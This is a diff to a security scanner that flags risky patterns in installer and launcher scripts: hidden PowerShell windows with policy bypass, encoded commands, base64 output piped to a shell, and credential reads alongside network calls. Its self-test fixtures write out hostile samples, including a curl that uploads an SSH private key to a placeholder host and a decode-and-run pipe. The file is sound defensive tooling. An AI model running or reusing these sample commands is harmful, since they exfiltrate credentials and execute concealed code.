@@ -258,13 +258,50 @@ def _check_hidden_bypass(path, lines, text):
         re.compile(_BYPASS_ARRAY, re.I),
     )
     hidden_array = re.compile(r"(?i)['\"]-WindowStyle['\"]\s*,\s*['\"]Hidden['\"]")
+
+    def joined(i: int) -> str:
+        # An argv list formatted one element per line: `"-WindowStyle",` then `"Hidden",`.
+        return " ".join(x.strip().strip(",").strip("'\"") for x in _window(lines, i, 3, 3))
+
     out = []
     for i, line in enumerate(lines):
-        if not (hidden.search(line) or hidden_array.search(line)):
+        split_hidden = re.search(r"(?i)^\W*hidden\W*$", line) and hidden.search(joined(i))
+        if not (hidden.search(line) or hidden_array.search(line) or split_hidden):
             continue
         near = _window(lines, i, 3, 3)
-        if any(bypass.search(x) or array.search(x) for x in near):
+        if any(bypass.search(x) or array.search(x) for x in near) or bypass.search(joined(i)):
             out.append((i + 1, "error"))
+    return out
+
+
+_ENC_LAUNCH = [
+    re.compile(r"(?i)" + _ENC_CMD + r"\b"),
+    re.compile(
+        r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:nd?)?)?)?)?)?)?)?)?)?)?)?)?)"
+        r"[\s:]+['\"]?[A-Za-z0-9+/=]{16,}"
+    ),
+    # Decoded text piped into something that runs it; `| tar` or `> file` is data.
+    re.compile(
+        r"(?i)\bbase64\s+(?:-d|--decode)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da)?sh|python\d*|pwsh|powershell|node|perl|"
+        + _IEX
+        + r")\b"
+    ),
+]
+_RUNS_TEXT = re.compile(
+    r"(?i)\b" + _IEX + r"\b|\[scriptblock\]::Create|Reflection\.Assembly\]::Load|" + _ENC_CMD
+)
+
+
+def _check_encoded(path, lines, text):
+    from_b64 = re.compile(_FROM_B64, re.I)
+    out = []
+    for i, line in enumerate(lines):
+        if any(p.search(line) for p in _ENC_LAUNCH):
+            out.append((i + 1, "error"))
+        elif from_b64.search(line):
+            # Decoding a certificate or an archive is data; feeding the result to the engine is not.
+            runs = any(_RUNS_TEXT.search(x) for x in _window(lines, i, 0, 3))
+            out.append((i + 1, "error" if runs else "warn"))
     return out
 
 
@@ -272,7 +309,8 @@ def _check_credentials(path, lines, text):
     if not re.search(_ENV_ACCESS, text, re.I) or not re.search(_NETWORK, text, re.I | re.M):
         return []
     markers = [re.compile(m) for m in _CRED_NAMES] + [re.compile(m, re.I) for m in _CRED_MARKERS]
-    present = {m.pattern for m in markers if m.search(text)}
+    # Distinct credentials, not distinct patterns: id_rsa and id_ed25519 are two keys.
+    present = {hit.group(0).lower() for m in markers for hit in m.finditer(text)}
     if not present:
         return []
     severity = "error" if len(present) >= 2 else "warn"
@@ -467,12 +505,7 @@ RULES = [
         "pass a script file or plain -Command text; decode data only as data; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
         needles = (_ENC_CMD.lower(), "base64", "powershell", "pwsh"),
         applies = lambda p: p.endswith(LAUNCHERS),
-        line_patterns = [
-            r"(?i)" + _ENC_CMD + r"\b",
-            r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:nd?)?)?)?)?)?)?)?)?)?)?)?)?)[\s:]+['\"]?[A-Za-z0-9+/=]{16,}",
-            _FROM_B64,
-            r"(?i)\bbase64\s+(?:-d|--decode)\b[^\n]*\|",
-        ],
+        check = _check_encoded,
     ),
     Rule(
         "AV005",
@@ -786,6 +819,10 @@ def main() -> int:
 
     if arguments.self_test:
         return self_test()
+    if arguments.update and arguments.paths:
+        # The baseline covers the whole repository; rebuilding it from a few files would drop the rest.
+        print("--update rewrites the whole baseline and cannot be combined with --paths")
+        return 2
 
     try:
         findings = collect(arguments.paths)
@@ -1101,6 +1138,41 @@ def _fixtures() -> list[tuple[str, str, str, bool]]:
             "#!/bin/sh\nset -eu\ncurl -F key=@$HOME/.ssh/"
             + _J(("id_", "rsa"))
             + " https://example.invalid/u\ncat $HOME/.aws/credentials\n",
+            True,
+        ),
+        ("AV004", "t.sh", "base64 --decode archive.b64 | tar -xf -", False),
+        ("AV004", "t.sh", "echo $p | base64 -d | sh", True),
+        ("AV004", "t.ps1", "$der = [Convert]::" + _FROM_B64 + "($certificate)", True),
+        (
+            "AV007",
+            "t.py",
+            "argv = [\n    "
+            + q
+            + "-WindowStyle"
+            + q
+            + ",\n    "
+            + q
+            + "Hidden"
+            + q
+            + ",\n    "
+            + q
+            + "-ExecutionPolicy"
+            + q
+            + ",\n    "
+            + q
+            + _J(("By", "pass"))
+            + q
+            + ",\n]",
+            True,
+        ),
+        (
+            "AV008",
+            "s.py",
+            "import os, requests\nh = os.environ['HOME']\na = h + '/.ssh/"
+            + _J(("id_", "rsa"))
+            + "'\nb = h + '/.ssh/"
+            + _J(("id_", "ed25519"))
+            + "'\nrequests.post(u)\n",
             True,
         ),
         # Suppression is honoured outside the shipped installers and ignored inside them.
